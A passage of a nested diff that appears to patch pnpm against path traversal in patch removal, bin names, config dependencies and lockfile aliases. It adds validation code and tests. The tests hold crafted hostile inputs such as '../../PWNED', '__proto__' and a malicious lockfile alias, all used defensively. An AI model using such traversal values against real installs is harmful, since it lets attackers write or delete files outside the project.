- import { updatePatchedDependencies } from './updatePatchedDependencies.js'
- 
- export function rcOptionsTypes (): Record<string, unknown> {
-@@ -31,7 +33,7 @@ export type PatchRemoveCommandOptions = install.InstallCommandOptions & Pick<Con
- 
- export async function handler (opts: PatchRemoveCommandOptions, params: string[]): Promise<void> {
-   let patchesToRemove = params
--  const patchedDependencies = opts.patchedDependencies ?? {}
-+  const patchedDependencies = { ...opts.patchedDependencies }
- 
-   if (!params.length) {
-     const allPatches = Object.keys(patchedDependencies)
-@@ -60,16 +62,21 @@ export async function handler (opts: PatchRemoveCommandOptions, params: string[]
+--- a/pkg-manager/package-bins/src/index.ts
++++ b/pkg-manager/package-bins/src/index.ts
+@@ -49,7 +49,13 @@ function commandsFromBin (bin: PackageBin, pkgName: string, pkgPath: string): Co
+     const binName = commandName[0] === '@'
+       ? commandName.slice(commandName.indexOf('/') + 1)
+       : commandName
+-    // Validate: must be safe (no path traversal) - only allow URL-safe chars or $
++    // Validate: must be safe (no path traversal). Reject empty and the
++    // filesystem-relative names "." and ".." (these survive encodeURIComponent
++    // unchanged but resolve to the bin directory itself or its parent when
++    // joined to a target dir), then only allow URL-safe chars or $.
++    if (binName === '' || binName === '.' || binName === '..') {
++      continue
++    }
+     if (binName !== encodeURIComponent(binName) && binName !== '$') {
+       continue
      }
-   }
- 
--  const patchesDirs = new Set<string>()
--  await Promise.all(patchesToRemove.map(async (patch) => {
--    if (Object.hasOwn(patchedDependencies, patch)) {
--      const patchFile = patchedDependencies[patch]
--      patchesDirs.add(path.dirname(patchFile))
--      await fs.rm(patchFile, { force: true })
--      delete patchedDependencies![patch]
-+  const patchRemovalContext = await getPatchRemovalContext(opts)
-+  const patchesToRemoveTargets = await Promise.all(patchesToRemove.map(async (patch) => {
-+    const patchFile = patchedDependencies[patch]
-+    if (patchFile == null) {
-+      throw new PnpmError('PATCH_NOT_FOUND', `Patch "${patch}" not found in patched dependencies`)
-     }
-+    return getPatchRemovalTarget(patch, patchFile, patchRemovalContext)
-   }))
- 
-+  await Promise.all(patchesToRemoveTargets.map(unlinkPatchIfExists))
-+  for (const { patch } of patchesToRemoveTargets) {
-+    delete patchedDependencies[patch]
-+  }
-+
-+  const patchesDirs = new Set(patchesToRemoveTargets.map(({ parentDir }) => parentDir))
-   await Promise.all(Array.from(patchesDirs).map(async (dir) => {
-     try {
-       const files = await fs.readdir(dir)
-@@ -83,5 +90,114 @@ export async function handler (opts: PatchRemoveCommandOptions, params: string[]
-     workspaceDir: opts.workspaceDir ?? opts.rootProjectManifestDir,
-   })
- 
--  return install.handler(opts)
-+  return install.handler({
-+    ...opts,
-+    patchedDependencies,
-+  })
-+}
-+
-+interface PatchRemovalContext {
-+  lockfileDir: string
-+  patchesDir: string
-+  realPatchesDir?: string
-+}
-+
-+interface PatchRemovalTarget {
-+  patch: string
-+  patchFile: string
-+  parentDir: string
-+  targetPath: string
-+  targetExists: boolean
-+}
-+
-+async function getPatchRemovalContext (opts: PatchRemoveCommandOptions): Promise<PatchRemovalContext> {
-+  const lockfileDir = path.resolve(opts.lockfileDir ?? opts.dir ?? process.cwd())
-+  const realLockfileDir = await fs.realpath(lockfileDir)
-+  const patchesDirSetting = opts.patchesDir ?? 'patches'
-+  const patchesDir = path.join(lockfileDir, path.normalize(patchesDirSetting))
-+
-+  if (!isSubdirectory(lockfileDir, patchesDir)) {
-+    throw new PnpmError('PATCHES_DIR_OUTSIDE_PROJECT', `The configured patches directory is outside the project: ${patchesDirSetting}`)
-+  }
-+
-+  const realPatchesDir = await realpathIfExists(patchesDir)
-+  if (realPatchesDir != null && !isSubdirectory(realLockfileDir, realPatchesDir)) {
-+    throw new PnpmError('PATCHES_DIR_OUTSIDE_PROJECT', `The configured patches directory is outside the project: ${patchesDirSetting}`)
-+  }
-+
-+  return {
-+    lockfileDir,
-+    patchesDir,
-+    realPatchesDir,
-+  }
-+}
-+
-+async function getPatchRemovalTarget (
-+  patch: string,
-+  patchFile: string,
-+  ctx: PatchRemovalContext
-+): Promise<PatchRemovalTarget> {
-+  const targetPath = path.resolve(ctx.lockfileDir, patchFile)
-+  if (
-+    targetPath === ctx.patchesDir ||
-+    !isSubdirectory(ctx.patchesDir, targetPath)
-+  ) {
-+    throw new PnpmError('PATCH_FILE_OUTSIDE_PATCHES_DIR', `Patch file "${patchFile}" is outside the configured patches directory`)
-+  }
-+
-+  const parentDir = path.dirname(targetPath)
-+  const targetStats = await lstatIfExists(targetPath)
-+  const realParentDir = await realpathIfExists(parentDir)
-+  const realPatchesDir = ctx.realPatchesDir ?? (await realpathIfExists(ctx.patchesDir))
-+  if (
-+    realParentDir != null &&
-+    realPatchesDir != null &&
-+    !isSubdirectory(realPatchesDir, realParentDir)
-+  ) {
-+    throw new PnpmError('PATCH_FILE_OUTSIDE_PATCHES_DIR', `Patch file "${patchFile}" is outside the configured patches directory`)
-+  }
-+  if (targetStats?.isDirectory()) {
-+    throw new PnpmError('PATCH_FILE_IS_DIRECTORY', `Patch file "${patchFile}" is a directory`)
-+  }
-+
-+  return {
-+    patch,
-+    patchFile,
-+    parentDir,
-+    targetPath,
-+    targetExists: targetStats != null,
-+  }
-+}
-+
-+async function unlinkPatchIfExists ({ targetExists, targetPath }: PatchRemovalTarget): Promise<void> {
-+  if (!targetExists) return
-+
-+  try {
-+    await fs.unlink(targetPath)
-+  } catch (err: unknown) {
-+    if (isErrorWithCode(err, 'ENOENT')) return
-+    throw err
-+  }
-+}
-+
-+async function lstatIfExists (targetPath: string): Promise<Stats | undefined> {
-+  try {
-+    return await fs.lstat(targetPath)
-+  } catch (err: unknown) {
-+    if (isErrorWithCode(err, 'ENOENT')) return undefined
-+    throw err
-+  }
-+}
-+
-+async function realpathIfExists (targetPath: string): Promise<string | undefined> {
-+  try {
-+    return await fs.realpath(targetPath)
-+  } catch (err: unknown) {
-+    if (isErrorWithCode(err, 'ENOENT')) return undefined
-+    throw err
-+  }
-+}
-+
-+function isErrorWithCode (err: unknown, code: string): err is NodeJS.ErrnoException {
-+  return typeof err === 'object' && err !== null && 'code' in err && err.code === code
- }
---- /dev/null
-+++ b/patching/plugin-commands-patching/test/isSubdirectory.test.ts
-@@ -0,0 +1,19 @@
-+import path from 'path'
-+
-+import { isSubdirectory } from '../src/isSubdirectory.js'
-+
-+test('isSubdirectory() accepts paths inside the parent directory', () => {
-+  expect(isSubdirectory('/project/patches', '/project/patches/pkg.patch')).toBe(true)
-+  expect(isSubdirectory('/project/patches', '/project/patches/..pkg/pkg.patch')).toBe(true)
-+})
-+
-+test('isSubdirectory() rejects parent traversal and sibling prefixes', () => {
-+  expect(isSubdirectory('/project/patches', '/project/pkg.patch')).toBe(false)
-+  expect(isSubdirectory('/project/patches', '/project/patches-other/pkg.patch')).toBe(false)
-+})
-+
-+test('isSubdirectory() rejects Windows drive and UNC escapes', () => {
-+  expect(isSubdirectory('C:\\project\\patches', 'D:\\pkg.patch', path.win32)).toBe(false)
-+  expect(isSubdirectory('C:\\project\\patches', '\\\\server\\share\\pkg.patch', path.win32)).toBe(false)
-+  expect(isSubdirectory('C:\\project\\patches', 'C:\\project\\patches\\..pkg\\pkg.patch', path.win32)).toBe(true)
-+})
---- /dev/null
-+++ b/patching/plugin-commands-patching/test/patchRemove.test.ts
-@@ -0,0 +1,166 @@
-+import fs from 'fs'
-+import os from 'os'
-+import path from 'path'
-+
-+import { afterEach, beforeEach, expect, jest, test } from '@jest/globals'
-+import { install } from '@pnpm/plugin-commands-installation'
-+
-+import * as patchRemove from '../src/patchRemove.js'
-+import { updatePatchedDependencies } from '../src/updatePatchedDependencies.js'
-+import type { PatchRemoveCommandOptions } from '../src/patchRemove.js'
-+
-+jest.mock('@pnpm/plugin-commands-installation', () => ({
-+  install: {
-+    handler: jest.fn(),
-+  },
-+}))
-+
-+jest.mock('../src/updatePatchedDependencies.js', () => ({
-+  updatePatchedDependencies: jest.fn(),
-+}))
-+
-+const installHandler = jest.mocked(install.handler)
-+const updatePatchedDependenciesMock = jest.mocked(updatePatchedDependencies)
-+const testOnNonWindows = process.platform === 'win32' ? test.skip : test
-+
-+let tempRoot: string
-+
-+beforeEach(() => {
-+  tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'pnpm-patch-remove-'))
-+  installHandler.mockResolvedValue(undefined)
-+  updatePatchedDependenciesMock.mockResolvedValue(undefined)
-+})
-+
-+afterEach(() => {
-+  installHandler.mockReset()
-+  updatePatchedDependenciesMock.mockReset()
-+  fs.rmSync(tempRoot, { force: true, recursive: true })
-+})
-+
-+test('patch-remove rejects traversal outside the patches directory before deleting any patch', async () => {
-+  const projectDir = path.join(tempRoot, 'project')
-+  const outsideFile = path.join(tempRoot, 'outside.patch')
-+  const goodPatch = path.join(projectDir, 'patches/good.patch')
-+  fs.mkdirSync(path.dirname(goodPatch), { recursive: true })
-+  fs.writeFileSync(goodPatch, 'good patch', 'utf8')
-+  fs.writeFileSync(outsideFile, 'outside patch', 'utf8')
-+
-+  await expect(patchRemove.handler(createOptions(projectDir, {
-+    good: 'patches/good.patch',
-+    bad: '../outside.patch',
-+  }), ['good', 'bad'])).rejects.toMatchObject({
-+    code: 'ERR_PNPM_PATCH_FILE_OUTSIDE_PATCHES_DIR',
-+  })
-+
-+  expect(fs.existsSync(goodPatch)).toBe(true)
-+  expect(fs.existsSync(outsideFile)).toBe(true)
-+  expect(updatePatchedDependenciesMock).not.toHaveBeenCalled()
-+  expect(installHandler).not.toHaveBeenCalled()
-+})
-+
-+test('patch-remove rejects directory entries before deleting any patch', async () => {
-+  const projectDir = path.join(tempRoot, 'project')
-+  const goodPatch = path.join(projectDir, 'patches/good.patch')
-+  const patchDir = path.join(projectDir, 'patches/not-a-file.patch')
-+  fs.mkdirSync(patchDir, { recursive: true })
-+  fs.writeFileSync(goodPatch, 'good patch', 'utf8')
-+
-+  await expect(patchRemove.handler(createOptions(projectDir, {
-+    good: 'patches/good.patch',
-+    bad: 'patches/not-a-file.patch',
-+  }), ['good', 'bad'])).rejects.toMatchObject({
-+    code: 'ERR_PNPM_PATCH_FILE_IS_DIRECTORY',
-+  })
-+
-+  expect(fs.existsSync(goodPatch)).toBe(true)
-+  expect(updatePatchedDependenciesMock).not.toHaveBeenCalled()
-+  expect(installHandler).not.toHaveBeenCalled()
-+})
-+
-+testOnNonWindows('patch-remove rejects a nested parent symlink outside the patches directory before unlinking a dangling target', async () => {
-+  const projectDir = path.join(tempRoot, 'project')
-+  const patchesDir = path.join(projectDir, 'patches')
-+  const outsideDir = path.join(tempRoot, 'outside')
-+  const outsideDanglingLink = path.join(outsideDir, 'dangling.patch')
-+  fs.mkdirSync(patchesDir, { recursive: true })
-+  fs.mkdirSync(outsideDir, { recursive: true })
-+  fs.symlinkSync(outsideDir, path.join(patchesDir, 'linked-dir'), 'dir')
-+  fs.symlinkSync(path.join(tempRoot, 'missing-target.patch'), outsideDanglingLink)
-+
-+  await expect(patchRemove.handler(createOptions(projectDir, {
-+    bad: 'patches/linked-dir/dangling.patch',
-+  }), ['bad'])).rejects.toMatchObject({
-+    code: 'ERR_PNPM_PATCH_FILE_OUTSIDE_PATCHES_DIR',
-+  })
-+
-+  expect(fs.lstatSync(outsideDanglingLink).isSymbolicLink()).toBe(true)
-+  expect(updatePatchedDependenciesMock).not.toHaveBeenCalled()
-+  expect(installHandler).not.toHaveBeenCalled()
-+})
-+
-+testOnNonWindows('patch-remove unlinks a final symlink inside the patches directory without touching its target', async () => {
-+  const projectDir = path.join(tempRoot, 'project')
-+  const patchesDir = path.join(projectDir, 'patches')
-+  const outsideTarget = path.join(tempRoot, 'outside-target.patch')
-+  const patchLink = path.join(patchesDir, 'linked.patch')
-+  fs.mkdirSync(patchesDir, { recursive: true })
-+  fs.writeFileSync(outsideTarget, 'outside target', 'utf8')
-+  fs.symlinkSync(outsideTarget, patchLink)
-+
-+  await patchRemove.handler(createOptions(projectDir, {
-+    pkg: 'patches/linked.patch',
-+  }), ['pkg'])
-+
-+  expect(fs.existsSync(patchLink)).toBe(false)
-+  expect(fs.readFileSync(outsideTarget, 'utf8')).toBe('outside target')
-+  expect(updatePatchedDependenciesMock).toHaveBeenCalledWith({}, expect.any(Object))
-+  expect(installHandler).toHaveBeenCalledWith(expect.objectContaining({
-+    patchedDependencies: {},
-+  }))
-+})
-+
-+test('patch-remove allows a symlinked patches directory that resolves inside the project', async () => {
-+  const projectDir = path.join(tempRoot, 'project')
-+  const realPatchesDir = path.join(projectDir, 'real-patches')
-+  const patchFile = path.join(realPatchesDir, 'pkg.patch')
-+  fs.mkdirSync(realPatchesDir, { recursive: true })
-+  fs.symlinkSync(realPatchesDir, path.join(projectDir, 'patches'), process.platform === 'win32' ? 'junction' : 'dir')
-+  fs.writeFileSync(patchFile, 'patch', 'utf8')
-+
-+  await patchRemove.handler(createOptions(projectDir, {
-+    pkg: 'patches/pkg.patch',
-+  }), ['pkg'])
-+
-+  expect(fs.existsSync(patchFile)).toBe(false)
-+  expect(updatePatchedDependenciesMock).toHaveBeenCalledWith({}, expect.any(Object))
-+  expect(installHandler).toHaveBeenCalledWith(expect.objectContaining({
-+    patchedDependencies: {},
-+  }))
-+})
-+
-+test('patch-remove keeps missing patch files as no-ops', async () => {
-+  const projectDir = path.join(tempRoot, 'project')
-+  fs.mkdirSync(path.join(projectDir, 'patches'), { recursive: true })
-+
-+  await patchRemove.handler(createOptions(projectDir, {
-+    pkg: 'patches/missing.patch',
-+  }), ['pkg'])
-+
-+  expect(updatePatchedDependenciesMock).toHaveBeenCalledWith({}, expect.any(Object))
-+  expect(installHandler).toHaveBeenCalledWith(expect.objectContaining({
-+    patchedDependencies: {},
-+  }))
-+})
-+
-+function createOptions (
-+  projectDir: string,
-+  patchedDependencies: Record<string, string>
-+): PatchRemoveCommandOptions {
-+  return {
-+    dir: projectDir,
-+    lockfileDir: projectDir,
-+    patchedDependencies,
-+    rootProjectManifest: {},
-+    rootProjectManifestDir: projectDir,
-+  } as PatchRemoveCommandOptions
-+}
-
---- a/config/deps-installer/package.json
-+++ b/config/deps-installer/package.json
-@@ -1,6 +1,6 @@
- {
-   "name": "@pnpm/config.deps-installer",
--  "version": "1000.1.4",
-+  "version": "1000.1.8",
-   "description": "Installer for configurational dependencies",
-   "keywords": [
-     "pnpm",
-@@ -47,7 +47,9 @@
-     "@pnpm/read-package-json": "workspace:*",
-     "@pnpm/types": "workspace:*",
-     "@zkochan/rimraf": "catalog:",
--    "get-npm-tarball-url": "catalog:"
-+    "get-npm-tarball-url": "catalog:",
-+    "semver": "catalog:",
-+    "validate-npm-package-name": "catalog:"
-   },
-   "peerDependencies": {
-     "@pnpm/logger": "catalog:"
-@@ -57,6 +59,8 @@
-     "@pnpm/prepare": "workspace:*",
-     "@pnpm/registry-mock": "catalog:",
-     "@pnpm/testing.temp-store": "workspace:*",
-+    "@types/semver": "catalog:",
-+    "@types/validate-npm-package-name": "catalog:",
-     "load-json-file": "catalog:",
-     "read-yaml-file": "catalog:"
-   },
---- /dev/null
-+++ b/config/deps-installer/src/assertValidConfigDepName.ts
-@@ -0,0 +1,20 @@
-+import { PnpmError } from '@pnpm/error'
-+import validateNpmPackageName from 'validate-npm-package-name'
-+
-+// A config-dependency name becomes a directory pnpm creates during install
-+// (`node_modules/.pnpm-config/<name>`) and a store path segment, so it must be
-+// a valid npm package name. A traversal-shaped name (`../../PWNED`), a reserved
-+// name (`.bin`, `.pnpm`, `node_modules`), or `__proto__` is rejected before any
-+// path is built from it. Matches the `validForOldPackages` check pnpm applies
-+// to dependency aliases read from a manifest.
-+export function assertValidConfigDepName (name: string): void {
-+  if (!validateNpmPackageName(name).validForOldPackages) {
-+    throw new PnpmError(
-+      'INVALID_DEPENDENCY_NAME',
-+      `The configDependencies in pnpm-workspace.yaml contains a dependency with an invalid name: ${JSON.stringify(name)}`,
-+      {
-+        hint: 'A dependency name must be a valid npm package name — a single `name` or `@scope/name` consisting of URL-friendly characters, with no leading `.` or `_`, and not equal to reserved names such as `node_modules`.',
-+      }
-+    )
-+  }
-+}
---- /dev/null
-+++ b/config/deps-installer/src/assertValidConfigDepVersion.ts
-@@ -0,0 +1,15 @@
-+import { PnpmError } from '@pnpm/error'
-+import semver from 'semver'
-+
-+// A config-dep version becomes a store path segment (`<name>/<version>/<hash>`),
-+// so reject non-semver values to keep a traversal-shaped version from escaping
-+// the store root.
-+export function assertValidConfigDepVersion (name: string, version: string): void {
-+  if (semver.valid(version) == null) {
-+    throw new PnpmError(
-+      'INVALID_CONFIG_DEP_VERSION',
-+      `The config dependency "${name}" has an invalid version "${version}"`,
-+      { hint: 'A config dependency version must be an exact semver version.' }
-+    )
-+  }
-+}
---- a/config/deps-installer/src/normalizeConfigDeps.ts
-+++ b/config/deps-installer/src/normalizeConfigDeps.ts
-@@ -2,6 +2,8 @@
- import { PnpmError } from '@pnpm/error'
- import { pickRegistryForPackage } from '@pnpm/pick-registry-for-package'
- import { type ConfigDependencies, type Registries } from '@pnpm/types'
-+import { assertValidConfigDepName } from './assertValidConfigDepName.js'
-+import { assertValidConfigDepVersion } from './assertValidConfigDepVersion.js'
- 
- interface NormalizeConfigDepsOpts {
-   registries: Registries
-@@ -18,10 +20,14 @@
- export function normalizeConfigDeps (configDependencies: ConfigDependencies, opts: NormalizeConfigDepsOpts): NormalizedConfigDeps {
-   const deps: NormalizedConfigDeps = {}
-   for (const [pkgName, pkgSpec] of Object.entries(configDependencies)) {
-+    // Validate before building any path from the name or version: both become
-+    // path segments of the directories pnpm creates during install.
-+    assertValidConfigDepName(pkgName)
-     const registry = pickRegistryForPackage(opts.registries, pkgName)
- 
-     if (typeof pkgSpec === 'object') {
-       const { version, integrity } = parseIntegrity(pkgName, pkgSpec.integrity)
-+      assertValidConfigDepVersion(pkgName, version)
-       deps[pkgName] = {
-         version,
-         resolution: {
-@@ -34,6 +40,7 @@
- 
-     if (typeof pkgSpec === 'string') {
-       const { version, integrity } = parseIntegrity(pkgName, pkgSpec)
-+      assertValidConfigDepVersion(pkgName, version)
-       deps[pkgName] = {
-         version,
-         resolution: {
---- a/config/deps-installer/test/installConfigDeps.ts
-+++ b/config/deps-installer/test/installConfigDeps.ts
-@@ -1,4 +1,5 @@
- import fs from 'fs'
-+import path from 'path'
- import { prepareEmpty } from '@pnpm/prepare'
- import { getIntegrity, REGISTRY_MOCK_PORT } from '@pnpm/registry-mock'
- import { createTempStore } from '@pnpm/testing.temp-store'
-@@ -7,6 +8,22 @@
- 
- const registry = `http://localhost:${REGISTRY_MOCK_PORT}/`
- 
-+// Recursively search `dir` for an entry named `name`, without following
-+// symlinks (so it can't loop through the links a successful install creates).
-+function containsEntryNamed (dir: string, name: string): boolean {
-+  let entries: fs.Dirent[]
-+  try {
-+    entries = fs.readdirSync(dir, { withFileTypes: true })
-+  } catch {
-+    return false
-+  }
-+  for (const entry of entries) {
-+    if (entry.name === name) return true
-+    if (entry.isDirectory() && containsEntryNamed(path.join(dir, entry.name), name)) return true
-+  }
-+  return false
-+}
-+
- test('configuration dependency is installed', async () => {
-   prepareEmpty()
-   const { storeController } = createTempStore()
-@@ -101,4 +118,63 @@
-     rootDir: process.cwd(),
-     store: storeController,
-   })).rejects.toThrow("doesn't have an integrity checksum")
-+})
-+
-+test('a config dependency with a path-traversal name is rejected', async () => {
-+  prepareEmpty()
-+  const { storeController, storeDir } = createTempStore()
-+
-+  const configDeps: Record<string, string> = {
-+    '../../PWNED': `100.0.0+${getIntegrity('@pnpm.e2e/foo', '100.0.0')}`,
-+  }
-+  await expect(installConfigDeps(configDeps, {
-+    registries: {
-+      default: registry,
-+    },
-+    rootDir: process.cwd(),
-+    store: storeController,
-+  })).rejects.toThrow('invalid name')
-+
-+  expect(containsEntryNamed(process.cwd(), 'PWNED')).toBe(false)
-+  expect(containsEntryNamed(storeDir, 'PWNED')).toBe(false)
-+})
-+
-+test('a config dependency named __proto__ is rejected', async () => {
-+  prepareEmpty()
-+  const { storeController, storeDir } = createTempStore()
-+
-+  // JSON.parse makes `__proto__` an own enumerable key (as on-disk parsing
-+  // does); a plain object literal would set the prototype and hide it.
-+  const configDeps: Record<string, string> = JSON.parse(
-+    `{"__proto__":"100.0.0+${getIntegrity('@pnpm.e2e/foo', '100.0.0')}"}`
-+  )
-+  await expect(installConfigDeps(configDeps, {
-+    registries: {
-+      default: registry,
-+    },
-+    rootDir: process.cwd(),
-+    store: storeController,
-+  })).rejects.toThrow('invalid name')
-+
-+  expect(containsEntryNamed(process.cwd(), '__proto__')).toBe(false)
-+  expect(containsEntryNamed(storeDir, '__proto__')).toBe(false)
-+})
-+
-+test('a config dependency with a path-traversal version is rejected', async () => {
-+  prepareEmpty()
-+  const { storeController, storeDir } = createTempStore()
-+
-+  const configDeps: Record<string, string> = {
-+    '@pnpm.e2e/foo': `../../../PWNED+${getIntegrity('@pnpm.e2e/foo', '100.0.0')}`,
-+  }
-+  await expect(installConfigDeps(configDeps, {
-+    registries: {
-+      default: registry,
-+    },
-+    rootDir: process.cwd(),
-+    store: storeController,
-+  })).rejects.toThrow('invalid version')
-+
-+  expect(containsEntryNamed(process.cwd(), 'PWNED')).toBe(false)
-+  expect(containsEntryNamed(storeDir, 'PWNED')).toBe(false)
+--- a/pkg-manager/package-bins/test/index.ts
++++ b/pkg-manager/package-bins/test/index.ts
+@@ -145,6 +145,26 @@ test('skip scoped bin names with path traversal', async () => {
+   ])
  })
---- a/pkg-manager/headless/src/lockfileToHoistedDepGraph.ts
-+++ b/pkg-manager/headless/src/lockfileToHoistedDepGraph.ts
-@@ -15,6 +15,7 @@
- import { packageIsInstallable } from '@pnpm/package-is-installable'
- import { type PatchGroupRecord, getPatchInfo } from '@pnpm/patching.config'
- import { safeReadPackageJsonFromDir } from '@pnpm/read-package-json'
-+import { safeJoinModulesDir } from '@pnpm/symlink-dependency'
- import { type DepPath, type SupportedArchitectures, type ProjectId, type Registries, type AllowBuild } from '@pnpm/types'
- import {
-   type FetchPackageToStoreFunction,
-@@ -216,7 +217,7 @@
-       return
-     }
  
--    const dir = path.join(modules, dep.name)
-+    const dir = safeJoinModulesDir(modules, dep.name)
-     const depLocation = path.relative(opts.lockfileDir, dir)
-     const resolution = pkgSnapshotToResolution(depPath, pkgSnapshot, opts.registries)
-     let fetchResponse!: ReturnType<FetchPackageToStoreFunction>
++test('skip reserved bin names', async () => {
++  expect(
++    await getBinsFromPackageManifest({
++      name: 'malicious',
++      version: '1.0.0',
++      bin: {
++        '': './empty.js',
++        '.': './dot.js',
++        '..': './dot-dot.js',
++        '@scope/..': './scoped-dot-dot.js',
++        good: './good',
++      },
++    }, process.cwd())).toStrictEqual([
++    {
++      name: 'good',
++      path: path.resolve('good'),
++    },
++  ])
++})
++
+ test('skip directories.bin with path traversal', async () => {
+   // Security test: malicious packages can try to escape the package root
+   // using directories.bin to chmod files at arbitrary locations
 --- /dev/null
-+++ b/pkg-manager/headless/test/lockfileToHoistedDepGraph.test.ts
-@@ -0,0 +1,86 @@
-+/// <reference path="../../../__typings__/index.d.ts" />
-+import fs from 'fs'
-+import path from 'path'
++++ b/pnpm/src/packageManagerRegistries.ts
+@@ -0,0 +1,28 @@
++import { type Config, type PackageManagerNetworkConfig } from '@pnpm/config'
++import { type Registries } from '@pnpm/types'
 +
-+import { type LockfileObject } from '@pnpm/lockfile.fs'
-+import { tempDir } from '@pnpm/prepare'
++const DEFAULT_PACKAGE_MANAGER_REGISTRY = 'https://registry.npmjs.org/'
 +
-+// Imported from the built output rather than `../src` on purpose: the source
-+// pulls in `@yarnpkg/nm`'s `HoisterResult` type, which ts-jest cannot resolve
-+// transitively under `moduleResolution: node`. The `.d.ts` is a lib file, so
-+// `skipLibCheck` skips it, and the test exercises the shipped graph builder.
-+import { lockfileToHoistedDepGraph } from '../lib/lockfileToHoistedDepGraph.js'
-+
-+// A crafted lockfile whose dependency *alias* (the key pnpm turns into a
-+// `node_modules/<alias>` directory) is a path-traversal or reserved name,
-+// pointing at an otherwise ordinary package snapshot. The `nodeLinker:
-+// hoisted` restore path reads aliases straight from the lockfile, so this
-+// is the shape an attacker who can ship a lockfile would use to escape
-+// `node_modules` or overwrite pnpm-owned layout (`.bin` / `.pnpm`).
-+function craftedLockfile (alias: string): LockfileObject {
-+  return {
-+    lockfileVersion: '9.0',
-+    importers: {
-+      '.': {
-+        dependencies: { [alias]: '1.0.0' },
-+        specifiers: { [alias]: '1.0.0' },
-+      },
-+    },
-+    packages: {
-+      [`${alias}@1.0.0`]: {
-+        resolution: { integrity: 'sha512-deadbeef' },
-+      },
-+    },
-+  } as unknown as LockfileObject
++export type PackageManagerBootstrapConfig = Partial<PackageManagerNetworkConfig> & {
++  registries: Registries
 +}
 +
-+// `force: true` skips the installability check so the walk reaches the
-+// alias sink directly; the store controller throws if touched, proving
-+// the alias is rejected before any fetch or filesystem work.
-+function hoistedOpts (lockfileDir: string): Parameters<typeof lockfileToHoistedDepGraph>[2] {
-+  const unreachable = (name: string) => () => {
-+    throw new Error(`${name} must not be reached for a rejected alias`)
++/**
++ * The registries used to download and verify a package-manager binary. These
++ * are built from trusted config sources only (CLI options, env config, user
++ * and global .npmrc), defaulting to the public npm registry — repository
++ * config must not steer where pnpm fetches the binary it is about to execute.
++ */
++export function getPackageManagerRegistries (config: Config): Registries {
++  return {
++    default: DEFAULT_PACKAGE_MANAGER_REGISTRY,
++    ...config.packageManagerRegistries,
 +  }
-+  return {
-+    autoInstallPeers: false,
-+    engineStrict: false,
-+    force: true,
-+    importerIds: ['.'],
-+    include: { dependencies: true, devDependencies: true, optionalDependencies: true },
-+    ignoreScripts: false,
-+    lockfileDir,
-+    nodeVersion: process.version,
-+    pnpmVersion: '0.0.0',
-+    registries: { default: 'http://localhost/' },
-+    sideEffectsCacheRead: false,
-+    skipped: new Set<string>(),
-+    storeController: {
-+      fetchPackage: unreachable('fetchPackage'),
-+      getFilesIndexFilePath: unreachable('getFilesIndexFilePath'),
-+    },
-+    storeDir: path.join(lockfileDir, 'store'),
-+    virtualStoreDir: path.join(lockfileDir, 'node_modules', '.pnpm'),
-+  } as unknown as Parameters<typeof lockfileToHoistedDepGraph>[2]
 +}
 +
-+test.each([
-+  '../../../escape',
-+  '@scope/../../escape',
-+  '.bin',
-+  '.pnpm',
-+  'node_modules',
-+])('lockfileToHoistedDepGraph rejects hoisted alias %p', async (alias) => {
-+  const dir = tempDir(false)
-+  await expect(
-+    lockfileToHoistedDepGraph(craftedLockfile(alias), null, hoistedOpts(dir))
-+  ).rejects.toThrow(expect.objectContaining({ code: 'ERR_PNPM_INVALID_DEPENDENCY_NAME' }))
-+})
-+
-+test('lockfileToHoistedDepGraph does not create a file outside node_modules for a traversal alias', async () => {
-+  const dir = tempDir(false)
-+  const escaped = path.join(dir, 'node_modules', '..', '..', '..', 'escape')
-+  await expect(
-+    lockfileToHoistedDepGraph(craftedLockfile('../../../escape'), null, hoistedOpts(dir))
-+  ).rejects.toThrow(expect.objectContaining({ code: 'ERR_PNPM_INVALID_DEPENDENCY_NAME' }))
-+  expect(fs.existsSync(escaped)).toBe(false)
-+})
-
---- a/fs/symlink-dependency/package.json
-+++ b/fs/symlink-dependency/package.json
-@@ -37,7 +37,8 @@
-   "dependencies": {
-     "@pnpm/core-loggers": "workspace:*",
-     "@pnpm/types": "workspace:*",
--    "symlink-dir": "catalog:"
-+    "symlink-dir": "catalog:",
-+    "validate-npm-package-name": "catalog:"
-   },
-   "peerDependencies": {
-     "@pnpm/logger": "catalog:"
-@@ -45,7 +46,8 @@
-   "devDependencies": {
-     "@pnpm/logger": "workspace:*",
-     "@pnpm/prepare": "workspace:*",
--    "@pnpm/symlink-dependency": "workspace:*"
-+    "@pnpm/symlink-dependency": "workspace:*",
-+    "@types/validate-npm-package-name": "catalog:"
-   },
-   "engines": {
-     "node": ">=18.12"
---- a/fs/symlink-dependency/src/safeJoinModulesDir.ts
-+++ b/fs/symlink-dependency/src/safeJoinModulesDir.ts
-@@ -1,19 +1,37 @@
- import path from 'path'
++export function getPackageManagerBootstrapConfig (config: Config): PackageManagerBootstrapConfig {
++  return {
++    ...config.packageManagerNetworkConfig,
++    registries: getPackageManagerRegistries(config),
++  }
++}
+--- a/pnpm/src/switchCliVersion.ts
++++ b/pnpm/src/switchCliVersion.ts
+@@ -8,6 +8,8 @@ import { installPnpmToTools } from '@pnpm/tools.plugin-commands-self-updater'
+ import spawn from 'cross-spawn'
+ import semver from 'semver'
  
--// `path.join(modulesDir, alias)` paired with a containment check, so a
--// caller can't accidentally use the joined path without verifying that
--// it lives inside `modulesDir`. Earlier passes reject path-traversal
--// aliases at manifest-read time, but this layer also runs for paths
--// reconstructed from lockfiles and snapshots, so the check stays here
--// as a final guarantee.
-+import validateNpmPackageName from 'validate-npm-package-name'
++import { getPackageManagerBootstrapConfig } from './packageManagerRegistries.js'
 +
-+// Joins `modulesDir` with a dependency alias and guarantees the result
-+// stays a direct child of `modulesDir`. The alias becomes a directory
-+// name inside `node_modules`, so it must be a valid npm package name: a
-+// single `name` or `@scope/name` of URL-friendly characters with no
-+// leading `.` or `_`, and not a reserved name. That rejects
-+// path-traversal (`../x`), absolute, and pnpm-owned aliases (`.bin`,
-+// `.pnpm`, `node_modules`) before they can escape `modulesDir` or
-+// overwrite pnpm's own layout. The containment check is kept as a
-+// belt-and-suspenders guard for any platform-specific join behavior the
-+// name check might not anticipate.
-+//
-+// Earlier passes reject such aliases at manifest-read and resolution
-+// time, but this layer also runs for paths reconstructed from lockfiles
-+// and snapshots, so the check stays here as a final guarantee.
- export function safeJoinModulesDir (modulesDir: string, alias: string): string {
-+  if (!validateNpmPackageName(alias).validForOldPackages) {
-+    throw invalidDependencyNameError(modulesDir, alias)
-+  }
-   const link = path.join(modulesDir, alias)
